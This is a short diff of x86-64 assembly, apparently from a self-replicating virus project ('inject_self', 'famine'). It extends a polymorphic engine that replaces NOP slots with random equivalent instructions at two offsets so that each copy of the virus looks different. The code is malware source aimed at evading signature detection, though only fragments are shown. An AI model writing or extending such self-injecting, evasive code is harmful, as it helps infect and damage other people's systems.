@@ -16,7 +16,7 @@ OBF_POLY_1
 dd 0x90909090
 
 .poly_nop_1:
-dd 0x90909090
+dd 0x90909090		; this line is to be replaced by random polymorphic instruction equl to 4byte nop
 db 0x90
 dw 0x9090
 db 0x90
@@ -635,13 +635,13 @@ inject_self:
 	mov r11, POLY_NOP_NUMBER	; the number of possible polymorphic intrustions 
 	mov rax, POLY_NOP_SIZE	; the size of instruction replaced (equal to the size of replacing one)
 	lea rsi, [rel poly_nop]
-	call .poly_nop
+	call .poly_engine
 	jmp .poly_nop2
 
 	;HERE IT REPLACE 4 BYTE NOP AT POLY_NOP_1_OFFSET WITH 4 BYTE IDENTICAL AS NOP ; 
 
 	;THE FUNCTION NEED : r10 AT THE OFFSET TO REPLACE DATA  - r11 REPRESENT NUMBER OF POSSIBLE POLY INTRSUCTIONS - rax HAS TO BE EQUAL TO THE SIZE TO REPLACE - RSI = lea rsi, [rel LOCATION OF POLY INTRUCTIONS]
-	.poly_nop:
+	.poly_engine:
 	call _start.get_random
 	xor rdi,rdi
 	mov dil, byte STACK(famine.tmp_rand)
@@ -660,8 +660,13 @@ inject_self:
 	ret
 	;END OF POLY 4byte NOPS
 	.poly_nop2:
+	xor r11, r11
 	lea r10, STACK(famine.tocypher)
-	add r10, POLY_NOP_1_OFFSET
+	add r10, POLY_NOP_2_OFFSET
+	mov r11, POLY_NOP_NUMBER
+	mov rax, POLY_NOP_SIZE
+	lea rsi, [rel poly_nop]
+	call .poly_engine
 	;setting r10 to REAL_POLY_2_OFFSET + location in mem
 
 
